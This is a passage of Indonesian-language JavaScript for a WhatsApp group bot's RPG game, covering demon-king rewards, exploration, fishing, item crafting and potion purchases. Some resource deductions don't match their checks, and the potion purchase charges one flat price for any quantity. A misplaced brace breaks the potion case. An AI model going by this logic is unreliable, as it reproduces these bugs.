HuBotZ.sendMessage(m.chat, { text: `Dan *${pushname}* Ditolong Oleh Seseorang Yang Entah Muncul Dari Mana. . .`, edit: key});
await sleep(3000);
let bhuud = "https://telegra.ph/file/cdf482a8de192189057d8.jpg"
var hg = `*Misi kill DemonKing*\n\n🎁 *DemonKing Kill Reward*\n ┊ *Money* : $${a}\n ┊ *Gold :* ${b}\n ┊ *Iron :* ${c}\n ┊ *Diamond :* ${d}\n\n*Terima Kasih Telah Melaksanakan Misi Ini*`
user.money += a
user.gold += b
user.iron += c
user.diamond += d
user.health -= 60
user.lastkilldemonking = new Date * 1;
user.armordurability -= ranNumb(80, 120)
user.sworddurability -= ranNumb(80, 120)
if (user.armordurability <= 0) {
user.armordurability = 0
user.armor = 0
}
if (user.sworddurability <= 0) {
user.sworddurability = 0
user.sword = 0
}
HuBotZ.sendMessage(m.chat, {image:{url:bhuud},caption: hg} , {quoted:m}) 
} else {
m.reply(`⏳ Kamu sudah membunuh Demon King! Silakan tunggu *${timers} Lagi*`);
}
}
break
case 'jelajah': {
let user = db.data.users[m.sender];
let __timers = (new Date - user.lastadventure)
let _timers = (3600000 - __timers) 
let timers = clockString(_timers)
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (user.health < 60) return reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`)
if (new Date - user.lastjelajah > timers) {
var tempsa = args.join(" ")
if (tempsa == 'corbiens river') {
var asu = `https://telegra.ph/file/00018dab77a6cea81523e.jpg`
setTimeout( async () => {
const vio = Math.ceil(Math.random() * 70) 
const pikan = Math.ceil(Math.random() * 15)
user.stone += vio
user.ikan += pikan
user.health -= 15
HuBotZ.sendMessage(m.chat, {image:{url: asu}, caption: `*Congratulation 🎊*\n\nKamu mendapatkan *${vio}* batu, *${pikan}* ikan dan darah mu berkurang -15\n\nCek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) 

} else if (tempsa === 'chiltawa woods') {
let gos = `https://telegra.ph/file/77c3badc9f97d6589a30f.jpg`
setTimeout( async () => {
const tesaaq = Math.ceil(Math.random() * 110) // batu
const ise = Math.ceil(Math.random() * 20)
user.stone += tesaaq
user.kayu += ise
user.health -= 15
HuBotZ.sendMessage(m.chat, {image:{url:gos},caption: `*Congratulation 🎊*\n\nKamu mendapatkan *${tesaaq}* batu, *${ise}* kayu dan darah mu berkurang -15\n\nCek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'cochher sea') { 
let seae = `https://telegra.ph/file/eabfc907cfc447386b0c0.jpg`
setTimeout( async () => {
const feds = Math.ceil(Math.random() * 40)
user.ikan += feds
user.health -= 15
HuBotZ.sendMessage(m.chat, {image:{url: seae},caption: `*Congratulation 🎊*\n\nKamu mendapatkan *${feds}* ikan dan darah mu berkurang -15\n\nCek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'limingstall mountains') {
let seoe = `https://telegra.ph/file/19a10ff95c31af10267e4.jpg`
setTimeout(() => {
const fads = Math.ceil(Math.random() * 50)
const fids = Math.ceil(Math.random() * 80)
user.ore += fads
user.stone += fids
user.health -= 15
HuBotZ.sendMessage(m.chat, {image:{url:seoe}, caption: `*Congratulation 🎊*\n\nKamu mendapatkan *${fads}* copper ore, ${fids} batu dan darah mu berkurang -15\n\nCek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'chade mountain') {
let seye = `https://telegra.ph/file/efdcd7d07dd22294695a8.jpg`
setTimeout( () => {
const pore = Math.ceil(Math.random() * 40)
const pone = Math.ceil(Math.random() * 60)
user.ore += pore
user.stone += pone
user.health -= 15
HuBotZ.sendMessage(m.chat, {image:{url:seye}, caption: `*Congratulation 🎊*\n\nKamu mendapatkan *${pore}* copper ore dan ${pone} batu\n\nCek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 3000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'gerbil woods') {
let siae = `https://telegra.ph/file/44fc684be9865c0fcb5fa.jpg`
setTimeout( async () => {
const tzys = Math.ceil(Math.random() * 90) // batu
const isue = Math.ceil(Math.random() * 45)
user.stone += tzys
user.kayu += isue
user.health -= 15
HuBotZ.sendMessage(m.chat, {image:{url:siae}, caption: `*Congratulation 🎊*\n\nKamu mendapatkan *${tzys}* batu, *${isue}* kayu dan darah mu berkurang -15\n\nCek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'moobiens grassland') {
let bbbb = `https://telegra.ph/file/0c3fa86f57a4f6d9c4c0e.jpg`
setTimeout( () => {
const awqu = Math.ceil(Math.random() * 200) // batu
const usui = Math.ceil(Math.random() * 20)
user.stone += awqu
user.kayu += usui
user.health -= 15
HuBotZ.sendMessage(m.chat, {image:{url:bbbb}, caption: `*Congratulation 🎊*\n\nKamu mendapatkan *${awqu}* batu, ${usui} kayu dan darah mu berkurang -15\n\nCek inventory anda dengan cara ketik ${prefix}inventory`} ,{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec
} else {
let seae = await getBuffer(`https://telegra.ph/file/16857796fab2ccb6cffc2.jpg`)
tesk = `*PILIH WILAYAH YANG INGIN KAMU JELAJAHI*


⚪ Corbiens River
🔵 Cochher Sea
⚫ Moobiens Grassland
🟣 Gerbil Woods
🟢 Chiltawa Woods
🟠 Limingstall Mountains
🔴 Chade Mountain

Example :
- ${prefix}jelajah corbiens river
`
HuBotZ.sendMessage(m.chat, { image: seae, caption: tesk}, {quoted: m}) 
}
} else {
m.reply(`_*COOLDOWN*_\nKamu Sudah Berjelajah Selama Sejam Terakhir\nMohon Tunggu *${timers}* Untuk Berjelajah Lagi`)
}
}
break
case 'mancing': {
  let __timers = new Date() - db.data.users[m.sender].lastfishing;
  let _timers = 300000 - __timers;
  let timers = clockString(_timers);

  if (!m.isGroup) return reply('Fitur Khusus Group!');
  if (user.fisingrod == 0) {
  return m.reply('Kamu tidak bisa mancing tanpa alat mancing (pancingan)! 🎣');
  }

  if (new Date() - db.data.users[m.sender].lastfishing > timers) {
    const fishing = Math.ceil(Math.random() * 10);
    let { key } = await HuBotZ.sendMessage(m.chat, { text: "🎣 Mulai Memancing . . ." }, { quoted: m });
    await sleep(1000);
    const message = [
      "🎣 Menarik Kail. . ."
    ];

    for (let i = 0; i < message.length; i++) {
      await HuBotZ.sendMessage(m.chat, { text: message[i], edit: key });
    }

    await sleep(3000);
    HuBotZ.sendMessage(m.chat, { text: 'Berhasil Mendapatkan Ikan . . .', edit: key });
    await sleep(3000);
  	user.fishingroddurability -= ranNumb(80, 120)
 	if (user.fishingroddurability <= 0) {
 		user.fishingroddurability = 0
 		user.fishingrod = 0
 	}
    user.ikan += fishing
    db.data.users[m.sender].lastfishing = new Date() * 1;
    HuBotZ.sendMessage(m.chat, { text: `*Congratulation 🎊*\n\n kamu mendapatkan *${fishing}* Ikan selama 2 menit\ndurability fishingrod kamu berkurang `, edit: key });

  } else {
    m.reply(`Kamu Udah Mancing, Tunggu *${timers} Lagi*`);
  }
}
break;
case 'crafting':
case 'craft': {
  if (!m.isGroup) return reply('Fitur Khusus Group!');
	let user = db.data.users[m.sender]
	let info = `
	Format : *${prefix + command} [item] [jumlah]*
	Contoh : *${prefix + command} armor 2*
	*━━━[ CRAFTING LIST ]━━━*
	*[ kargo ]*     	*[ planks ]*
	
	*[ kapal ]*        	*[ stick ]*

	*[ 🥼 armor ]*
	    │
	    ├─> *Helmet*
	    │    ├─> *leather_helmet*
	    │    ├─> *chainmail_helmet*
	    │    ├─> *iron_helmet
	    │    ├─> *gold_helmet*
	    │    └─> *diamond_helmet
	    │
	    ├─> *Chestplate*
	    │    ├─> *leather_chestplate*
	    │    ├─> *chainmail_chestplate*
	    │    ├─> *iron_chestplate*
	    │    ├─> *gold_helmet*
	    │    └─> *diamond_helmet*
	    │
	    ├─> *Leggings*
	    │    ├─> *leather_leggings
	    │    ├─> *chainmail_leggings*
	    │    ├─> *iron_leggings*
	    │    ├─> *gold_leggings*
	    │    └─> *diamond_leggings*
	    │
	    └─> *Boots*
	         ├─> *leather_boots*
	         ├─> *chainmail_boots*
	         ├─> *iron_boots*
	         ├─> *gold_boots*
	         └─> *diamond_boots*
	         
	*[ ⚔️ sword ]*
        ├─> *wodden_sword*
        ├─> *stone_sword*
        ├─> *gold_sword*
        ├─> *iron_sword*
        └─> *diamond_sword*
	
	*[ ⛏️ pickaxe ]*
	    ├─> *wood_pickaxe*
	    ├─> *stone_pickaxe*
	    ├─> *gold_pickaxe*
	    ├─> *iron_pickaxe*
	    └─> *diamond_pickaxe*
	    
    *[ 🪓 axe ]*
	    ├─> *wood_axe*
	    ├─> *stone_axe*
	    ├─> *gold_axe*
	    ├─> *iron_axe*
	    └─> *diamond_axe*
	    
	*[ 🎣 fishingrod ]*
	
	*[ 🏹 bow ]*`
	
	const item = (args[0] || '').toLowerCase()
	const total = Math.floor(isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 1), Number.MAX_SAFE_INTEGER) : 1) * 1
	if (item == 'bow' || item == 'panah') {
		if (user.bow == 0) {
			if (user.kayu < 29 || user.string < 3 || user.iron < 1) return m.reply(`Diperlukan 29 wood, 3 string, 1 iron.\n\nAnda memiliki :\n━ ${user.kayu} wood\n━ ${user.string} string\n━ ${user.iron} iron`)
			user.kayu -= 29
			user.string -= 3
			user.iron -= 1
			user.bow += 1
			user.bowdurability += 250
			user.craftcount += 1
			m.reply(`Craft *1 🏹 Bow* Berhasil.\n\nDurability : ${user.bowdurability}`)
		} else {
			m.reply(`Anda sudah memiliki 🏹 Bow\n\nDurability : ${user.bowdurability}`)
		}
	} else if (item == 'pancing' || item == 'fishingrod') {
		if (user.fishingrod == 0) {
			if (user.iron < 10 || user.string < 4) return m.reply(`Diperlukan 10 iron, 4 string.\n\nAnda memiliki :\n━ ${user.iron} iron\n━ ${user.string} string`)
			user.iron -= 10
			user.string -= 4
			user.fishingrod += 1
			user.fishingroddurability += 250
			user.craftcount += 1
			m.reply(`Craft *1 🎣 Fishingrod* Berhasil.\n\nDurability : ${user.fishingroddurability}`)
		} else {
			m.reply(`Anda sudah memiliki 🎣 Fishingrod\n\nDurability : ${user.fishingroddurability}`)
		}
	} else if (item == 'beliung' || item == 'pickaxe') {
		m.reply(`Use ${prefix +command} name_pickaxe count\n\nExample : *${prefix + command} wood_pickaxe 1`)
	} else if (item == 'beliung_kayu' || item == 'wood_pickaxe'|| item == 'wooden_pickaxe') {
		if (user.woodpick == 0) {
			if (user.stick < 2 || user.woodplank < 3) return m.reply(`Diperlukan 2 stick, 3 wood planks.\n\nAnda hanya memiliki :\n━ ${user.stick} stick\n━ ${user.woodplank} wood planks`)
			user.stick -= 2
			user.woodplank -= 3
			user.woodpick += 1
			user.woodpickdurability += 50
			user.craftcount += 1
			m.reply(`Craft *1 ⛏️ Wood pickaxe* Berhasil.\n\nDurability : ${user.woodpickdurability}`)
		} else {
			m.reply(`Anda sudah memiliki ⛏️ Wood pickaxe\n\nDurability : ${user.woodpickdurability}`)
		}
	} else if (item == 'beliung_batu' || item == 'stone_pickaxe') {
		if (user.stonepick == 0) {
			if (user.stick < 2 || user.cobblestone < 3) return m.reply(`Diperlukan 2 stick, 3 cobblestone.\n\nAnda hanya memiliki :\n━ ${user.stick} stick\n━ ${user.cobblestone} cobblestone`)
			user.stick -= 2
			user.cobblestone -= 3
			user.stonepick += 1
			user.stonepickdurability += 75
			user.craftcount += 1
			m.reply(`Craft *1 ⛏️ Stone Pickaxe* Berhasil.\n\nDurability : ${user.stonepickdurability}`)
		} else {
			m.reply(`Anda sudah memiliki ⛏️ Stone Pickaxe\n\nDurability : ${user.stonepickdurability}`)
		}
	} else if (item == 'beliung_emas' || item == 'gold_pickaxe') {
		if (user.goldpick == 0) {
			if (user.stick < 2 || user.gold < 3) return m.reply(`Diperlukan 2 stick, 3 gold ingot.\n\nAnda hanya memiliki :\n━ ${user.stick} stick\n━ ${user.gold} gold ingot`)
			user.stick -= 2
			user.gold -= 3
			user.goldpick += 1
			user.goldpickdurability += 40
			user.craftcount += 1
			m.reply(`Craft *1 ⛏️ Gold Pickaxe* Berhasil.\n\nDurability : ${user.goldpickdurability}`)
		} else {
			m.reply(`Anda sudah memiliki ⛏️ Gold Pickaxe\n\nDurability : ${user.goldpickdurability}`)
		}
	} else if (item == 'beliung_besi' || item == 'iron_pickaxe') {
		if (user.ironpick == 0) {
			if (user.stick < 2 || user.iron < 3) return m.reply(`Diperlukan 2 stick, 3 iron ingot.\n\nAnda hanya memiliki :\n━ ${user.stick} stick\n━ ${user.iron} iron ingot`)
			user.stick -= 2
			user.iron -= 3
			user.ironpick += 1
			user.ironpickdurability += 125
			user.craftcount += 1
			m.reply(`Craft *1 ⛏️ Iron Pickaxe* Berhasil.\n\nDurability : ${user.ironpickdurability}`)
		} else {
			m.reply(`Anda sudah memiliki ⛏️ Iron Pickaxe\n\nDurability : ${user.ironpickdurability}`)
		}
	} else if (item == 'beliung_berlian' || item == 'diamond_pickaxe') {
		if (user.diamondpick == 0) {
			if (user.stick < 2 || user.diamond < 3) return m.reply(`Diperlukan 2 stick, 3 diamond.\n\nAnda hanya memiliki :\n━ ${user.stick} stick\n━ ${user.diamond} diamond`)
			user.stick -= 2
			user.iron -= 3
			user.diamondpick += 1
			user.diamondpickdurability += 250
			user.craftcount += 1
			m.reply(`Craft *1 ⛏️ Diamond Pickaxe* Berhasil.\n\nDurability : ${user.diamondpickdurability}`)
		} else {
			m.reply(`Anda sudah memiliki ⛏️ Diamond Pickaxe\n\nDurability : ${user.diamondpickdurability}`)
		}
    } else if (item == 'kapak' || item == 'axe') {
		if (user.axe == 0) {
			if (user.iron < 15 || user.kayu < 18 || user.steel < 8) return m.reply(`Diperlukan 15 iron, 18 kayu dan 8 steel.\n\nAnda memiliki :\n━ ${user.iron} iron\n━ ${user.kayu} wood`)
			user.iron -= 15
			user.kayu -= 18
			user.steel -= 8
			user.axe += 1
			user.axedurability += 250
			user.craftcount += 1
			m.reply(`Craft *1 🪓 Axe* Berhasil.\n\nDurability : ${user.axedurability}`)
		} else {
			m.reply(`Anda sudah memiliki 🪓 Axe\n\nDurability : ${user.axedurability}`)
		}
	} else if (item == 'pedang_kayu' || item == 'wood_sword' || item == 'wooden_sword') {
		if (user.woodsword == 0) {
			if (user.planks < 2 || user.stick < 1) return m.reply(`Diperlukan 2 Planks, dan 1 Stick.\n\nAnda memiliki :\n━ ${user.planks} Cobblestone\n━ ${user.stick} Stick`)
			user.planks -= 2
			user.stick -= 1
			user.woodsword += 1
			user.woodsworddurability += 60
			user.craftcount += 1
			m.reply(`Craft *1 ⚔️  wooden sword* Berhasil.\n\nDurability : ${user.woodsworddurability}`)
		} else {
			m.reply(`Anda sudah memiliki ⚔️ wood sword\n\nDurability : ${user.woodsworddurability}`)
		}
	} else if (item == 'pedang_batu' || item == 'stone_sword') {
		if (user.stonesword == 0) {
			if (user.cobblestone < 2 || user.stick < 1) return m.reply(`Diperlukan 2 Cobblestone, dan 1 Stick.\n\nAnda memiliki :\n━ ${user.cobblestone} Planks\n━ ${user.stick} Stick`)
			user.cobblestone -= 2
			user.stick -= 1
			user.stonesword += 1
			user.stonesworddurability += 132
			user.craftcount += 1
			m.reply(`Craft *1 ⚔️  stone sword* Berhasil.\n\nDurability : ${user.stonesworddurability}`)
		} else {
			m.reply(`Anda sudah memiliki ⚔️ stone sword\n\nDurability : ${user.stonesworddurability}`)
		}
	} else if (item == 'pedang_emas' || item == 'gold_sword') {
		if (user.goldsword == 0) {
			if (user.gold < 2 || user.stick < 1) return m.reply(`Diperlukan 2 Gold Ingot, dan 1 Stick.\n\nAnda memiliki :\n━ ${user.gold} Gold\n━ ${user.stick} Stick`)
			user.gold -= 2
			user.stick -= 1
			user.goldsword += 1
			user.goldsworddurability += 132
			user.craftcount += 1
			m.reply(`Craft *1 ⚔️  gold sword* Berhasil.\n\nDurability : ${user.goldsworddurability}`)
		} else {
			m.reply(`Anda sudah memiliki ⚔️ gold sword\n\nDurability : ${user.goldsworddurability}`)
		}
	} else if (item == 'pedang_besi' || item == 'iron_sword') {
		if (user.ironsword == 0) {
			if (user.iron < 2 || user.stick < 1) return m.reply(`Diperlukan 2 Iron Ingot, dan 1 Stick.\n\nAnda memiliki :\n━ ${user.iron} Iron\n━ ${user.stick} Stick`)
			user.iron -= 2
			user.stick -= 1
			user.ironsword += 1
			user.ironsworddurability += 251
			user.craftcount += 1
			m.reply(`Craft *1 ⚔️ iron sword* Berhasil.\n\nDurability : ${user.ironsworddurability}`)
		} else {
			m.reply(`Anda sudah memiliki ⚔️ iron sword\n\nDurability : ${user.ironsworddurability}`)
		}
	} else if (item == 'pedang_berlian' || item == 'diamond_sword') {
		if (user.diamondsword == 0) {
			if (user.diamond < 2 || user.stick < 1) return m.reply(`Diperlukan 2 Diamond, dan 1 Stick.\n\nAnda memiliki :\n━ ${user.diamond} Iron\n━ ${user.stick} Stick`)
			user.diamond -= 2
			user.stick -= 1
			user.diamondsword += 1
			user.diamondsworddurability += 1562
			user.craftcount += 1
			m.reply(`Craft *1 ⚔️ diamond sword* Berhasil.\n\nDurability : ${user.diamondsworddurability}`)
		} else {
			m.reply(`Anda sudah memiliki ⚔️ diamond sword\n\nDurability : ${user.diamondsworddurability}`)
		}
	} else if (item == 'helm_kulit' || item == 'leather_helmet') {
		if (user.leatherhelmet == 0) {
			if (user.leather < 5) return m.reply(`Diperlukan 5 kulit.\n\nAnda memiliki :\n━ ${user.leather} kulit`)
			user.leather -= 5
			user.leatherhelmet += 1
			user.leatherhelmetdurability += 55
			user.craftcount += 1
			m.reply(`Craft *1 leather_helmet* Berhasil.\n\nDurability : ${user.leatherhelmetdurability}`)
		} else {
			m.reply(`Anda sudah memiliki leather_helmet\n\nDurability : ${user.leatherhelmetdurability}`)
		}
	} else if (item == 'helm_besi' || item == 'iron_helmet') {
		if (user.ironhelmet == 0) {
			if (user.iron < 5) return m.reply(`Diperlukan 5 iron ingot.\n\nAnda memiliki :\n━ ${user.iron} iron ingot`)
			user.iron -= 5
			user.ironhelmet += 1
			user.ironhelmetdurability += 165
			user.craftcount += 1
			m.reply(`Craft *1 iron_helmet* Berhasil.\n\nDurability : ${user.ironhelmetdurability}`)
		} else {
			m.reply(`Anda sudah memiliki iron_helmet\n\nDurability : ${user.ironhelmetdurability}`)
		}
	} else if (item == 'helm_emas' || item == 'gold_helmet') {
		if (user.goldhelmet == 0) {
			if (user.gold < 5) return m.reply(`Diperlukan 5 gold ingot.\n\nAnda memiliki :\n━ ${user.gold} gold ingot`)
			user.gold -= 5
			user.goldhelmet += 1
			user.goldhelmetdurability += 77
			user.craftcount += 1
			m.reply(`Craft *1 gold_helmet* Berhasil.\n\nDurability : ${user.goldhelmetdurability}`)
		} else {
			m.reply(`Anda sudah memiliki gold_helmet\n\nDurability : ${user.goldhelmetdurability}`)
		}
	} else if (item == 'helm_berlian' || item == 'diamond_helmet') {
		if (user.diamondhelmet == 0) {
			if (user.diamond < 5) return m.reply(`Diperlukan 5 diamond.\n\nAnda memiliki :\n━ ${user.diamond} diamond`)
			user.diamond -= 5
			user.diamondhelmet += 1
			user.diamondhelmetdurability += 363
			user.craftcount += 1
			m.reply(`Craft *1 diamond_helmet* Berhasil.\n\nDurability : ${user.diamondhelmetdurability}`)
		} else {
			m.reply(`Anda sudah memiliki diamond_helmet\n\nDurability : ${user.diamondhelmetdurability}`)
		}
	} else if (item == 'pelat_dada_kulit' || item == 'leather_chestplate') {
		if (user.leatherchestplate == 0) {
			if (user.leather < 8) return m.reply(`Diperlukan 8 kulit.\n\nAnda memiliki :\n━ ${user.leather} kulit`)
			user.leather -= 5
			user.leatherchestplate += 1
			user.leatherchestplatedurability += 80
			user.craftcount += 1
			m.reply(`Craft *1 leather_chestplate* Berhasil.\n\nDurability : ${user.leatherchestplatedurability}`)
		} else {
			m.reply(`Anda sudah memiliki leather_chestplate\n\nDurability : ${user.leatherchestplatedurability}`)
		}
	} else if (item == 'pelat_dada_besi' || item == 'iron_chestplate') {
		if (user.ironchestplate == 0) {
			if (user.iron < 8) return m.reply(`Diperlukan 8 iron ingot.\n\nAnda memiliki :\n━ ${user.iron} iron ingot`)
			user.iron -= 5
			user.ironchestplate += 1
			user.ironchestplatedurability += 240
			user.craftcount += 1
			m.reply(`Craft *1 iron_chestplate* Berhasil.\n\nDurability : ${user.ironchestplatedurability}`)
		} else {
			m.reply(`Anda sudah memiliki iron_chestplate\n\nDurability : ${user.ironchestplatedurability}`)
		}
	} else if (item == 'pelat_dada_emas' || item == 'gold_chestplate') {
		if (user.goldchestplate == 0) {
			if (user.gold < 8) return m.reply(`Diperlukan 8 gold ingot.\n\nAnda memiliki :\n━ ${user.gold} gold ingot`)
			user.gold -= 5
			user.goldchestplate += 1
			user.goldchestplatedurability += 112
			user.craftcount += 1
			m.reply(`Craft *1 gold_chestplate* Berhasil.\n\nDurability : ${user.goldchestplatedurability}`)
		} else {
			m.reply(`Anda sudah memiliki gold_chestplate\n\nDurability : ${user.goldchestplatedurability}`)
		}
	} else if (item == 'pelat_dada_berlian' || item == 'diamond_chestplate') {
		if (user.diamondchestplate == 0) {
			if (user.diamond < 8) return m.reply(`Diperlukan 8 diamond.\n\nAnda memiliki :\n━ ${user.diamond} diamond`)
			user.diamond -= 5
			user.diamondchestplate += 1
			user.diamondchestplatedurability += 528
			user.craftcount += 1
			m.reply(`Craft *1 diamond_chestplate* Berhasil.\n\nDurability : ${user.diamondchestplatedurability}`)
		} else {
			m.reply(`Anda sudah memiliki diamond_chestplate\n\nDurability : ${user.diamondchestplatedurability}`)
		}
	} else if (item == 'celana_kulit' || item == 'leather_leggings') {
		if (user.leatherleggings == 0) {
			if (user.leather < 7) return m.reply(`Diperlukan 7 kulit.\n\nAnda memiliki :\n━ ${user.leather} kulit`)
			user.leather -= 5
			user.leatherleggings += 1
			user.leatherleggingsdurability += 75
			user.craftcount += 1
			m.reply(`Craft *1 leather_leggings* Berhasil.\n\nDurability : ${user.leatherleggingsdurability}`)
		} else {
			m.reply(`Anda sudah memiliki leather_leggings\n\nDurability : ${user.leatherleggingsdurability}`)
		}
	} else if (item == 'celana_besi' || item == 'iron_leggings') {
		if (user.ironleggings == 0) {
			if (user.iron < 7) return m.reply(`Diperlukan 7 iron ingot.\n\nAnda memiliki :\n━ ${user.iron} iron ingot`)
			user.iron -= 5
			user.ironleggings += 1
			user.ironleggingsdurability += 225
			user.craftcount += 1
			m.reply(`Craft *1 iron_leggings* Berhasil.\n\nDurability : ${user.ironleggingsdurability}`)
		} else {
			m.reply(`Anda sudah memiliki iron_leggings\n\nDurability : ${user.ironleggingsdurability}`)
		}
	} else if (item == 'celana_emas' || item == 'gold_leggings') {
		if (user.goldleggings == 0) {
			if (user.gold < 7) return m.reply(`Diperlukan 7 gold ingot.\n\nAnda memiliki :\n━ ${user.gold} gold ingot`)
			user.gold -= 5
			user.goldleggings += 1
			user.goldleggingsdurability += 105
			user.craftcount += 1
			m.reply(`Craft *1 gold_leggings* Berhasil.\n\nDurability : ${user.goldleggingsdurability}`)
		} else {
			m.reply(`Anda sudah memiliki gold_leggings\n\nDurability : ${user.goldleggingsdurability}`)
		}
	} else if (item == 'celana_berlian' || item == 'diamond_leggings') {
		if (user.diamondleggings == 0) {
			if (user.diamond < 7) return m.reply(`Diperlukan 7 diamond.\n\nAnda memiliki :\n━ ${user.diamond} diamond`)
			user.diamond -= 5
			user.diamondleggings += 1
			user.diamondleggingsdurability += 495
			user.craftcount += 1
			m.reply(`Craft *1 diamond_leggings* Berhasil.\n\nDurability : ${user.diamondleggingsdurability}`)
		} else {
			m.reply(`Anda sudah memiliki diamond_leggings\n\nDurability : ${user.diamondleggingsdurability}`)
		}
	} else if (item == 'sepatu_kulit' || item == 'leather_boots') {
		if (user.leatherboots == 0) {
			if (user.leather < 4) return m.reply(`Diperlukan 4 kulit.\n\nAnda memiliki :\n━ ${user.leather} kulit`)
			user.leather -= 5
			user.leatherboots += 1
			user.leatherbootsdurability += 65
			user.craftcount += 1
			m.reply(`Craft *1 leather_boots* Berhasil.\n\nDurability : ${user.leatherbootsdurability}`)
		} else {
			m.reply(`Anda sudah memiliki leather_boots\n\nDurability : ${user.leatherbootsdurability}`)
		}
	} else if (item == 'sepatu_besi' || item == 'iron_boots') {
		if (user.ironboots == 0) {
			if (user.iron < 4) return m.reply(`Diperlukan 4 iron ingot.\n\nAnda memiliki :\n━ ${user.iron} iron ingot`)
			user.iron -= 5
			user.ironboots += 1
			user.ironbootsdurability += 195
			user.craftcount += 1
			m.reply(`Craft *1 iron_boots* Berhasil.\n\nDurability : ${user.ironbootsdurability}`)
		} else {
			m.reply(`Anda sudah memiliki iron_boots\n\nDurability : ${user.ironbootsdurability}`)
		}
	} else if (item == 'sepatu_emas' || item == 'gold_boots') {
		if (user.goldboots == 0) {
			if (user.gold < 4) return m.reply(`Diperlukan 4 gold ingot.\n\nAnda memiliki :\n━ ${user.gold} gold ingot`)
			user.gold -= 5
			user.goldboots += 1
			user.goldbootsdurability += 91
			user.craftcount += 1
			m.reply(`Craft *1 gold_boots* Berhasil.\n\nDurability : ${user.goldbootsdurability}`)
		} else {
			m.reply(`Anda sudah memiliki gold_boots\n\nDurability : ${user.goldbootsdurability}`)
		}
	} else if (item == 'sepatu_berlian' || item == 'diamond_boots') {
		if (user.diamondboots == 0) {
			if (user.diamond < 4) return m.reply(`Diperlukan 4 diamond.\n\nAnda memiliki :\n━ ${user.diamond} diamond`)
			user.diamond -= 5
			user.diamondboots += 1
			user.diamondbootsdurability += 429
			user.craftcount += 1
			m.reply(`Craft *1 diamond_boots* Berhasil.\n\nDurability : ${user.diamondbootsdurability}`)
		} else {
			m.reply(`Anda sudah memiliki diamond_boots\n\nDurability : ${user.diamondbootsdurability}`)
		}
	} else if (item == 'baja' || item == 'steel') {
		if (user.iron < 2 * total || user.money < 4000 * total) return m.reply(`Diperlukan ${2 * total} iron, ${4000 * total} money.\n\nAnda memiliki :\n━ ⛓️ ${user.iron} iron\n━ 💵 ${user.money} money`)
		user.iron -= 2 * total
		user.money -= 4000 * total
		user.steel += total
		user.craftcount += 1
		m.reply(`Craft *${total} steel* Berhasil.\n\nTotal steel : ${user.steel}`)
	} else if (item == 'kapal' || item == 'ship') {
		if (user.steel < 6 * total || user.iron < 13 * total || user.kayu < 13 * total) return m.reply(`Diperlukan ${6 * total} steel, ${13 * total} iron, ${13 * total} wood.\n\nAnda memiliki :\n━ ◻️ ${user.steel} steel\n━ ⛓️ ${user.iron} iron\n━ 🪵 ${user.kayu} wood`)
		user.steel -= 6 * total
		user.iron -= 13 * total
		user.kayu -= 13 * total
		user.kapal += total
		user.craftcount += 1
		m.reply(`Craft *${total} kapal* Berhasil.\n\nTotal kapal : ${user.kapal}`)
    	} else if (item == 'kargo' || item == 'cargo') {
    		if (user.iron < 30 * total || user.steel < 3 * total) return m.reply(`Diperlukan ${30 * total} iron, ${3 * total} steel.\n\nAnda memiliki :\n━ ⛓️ ${user.iron} iron\n━ ◻️ ${user.steel} steel`)
    		user.iron -= 30 * total
    		user.steel -= 3 * total
    		user.kargo += total
    		user.craftcount += 1
    		m.reply(`Craft *${total} kargo* Berhasil.\n\nTotal kargo : ${user.kargo}`)
    	} else if (item == 'tongkat' || item == 'stick') {
    		if (user.planks < 2 * total) return m.reply(`Diperlukan ${2 * total} planks untuk membuat ${total} stick\n\nAnda hanya memiliki :\n━ ${user.planks} planks`)
    		user.planks -= 2 * total
    		user.stick += total
    		user.craftcount += 1
    		m.reply(`Craft *${total} Stick* Berhasil.\n\nTotal Stick Yang Ada di Inventory : ${user.stick}`)
    	} else if (item == 'papan' || item == 'planks') {
    		if (user.kayu < 1 * total) return m.reply(`Diperlukan ${1 * total} planks untuk membuat ${total} Planks\n\nAnda hanya memiliki :\n━ ${user.kayu} Batang kayu`)
    		user.kayu -= 1 * total
    		user.planks += total
    		user.craftcount += 1
    		m.reply(`Craft *${total} Planks* Berhasil.\n\nTotal Planks Yang Ada di Inventory : ${user.planks}`)
	} else {
		m.reply(info)
	}
}
break
case 'beliramuan':
case 'buyramuan':
case 'belipotion':
case 'buypotion': {
let user = db.data.users[m.sender]
    if (!m.isGroup) return newReply('Fitur Khusus Group!');
    if (!text || isNaN(text)) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin dibeli berupa angka\n\nContoh ${prefix + command} 20\n*Harga 1 Potion = 5000*`);
}
bayar = parseInt(text);
const hargapotion = 5000
if ( user.money <= hargapotion ) return reply(`Maaf *${pushname}* Money Kamu Belum Cukup!\nUntuk Pembelian Sebanyak *${bayar}*`)
if ( user.money >= hargapotion ) {
user.money -= hargapotion
user.potion += bayar
await newReply(`*「 PEMBELIAN BERHASIL 」*\n\n*Jumlah Potion Dibeli : ${bayar}* \n\n*Potion didapat:* ${bayar}\n\n*Sisa Potion:* ${user.potion}\n\n*Sisa Uang:* $${user.money}`)
} else {
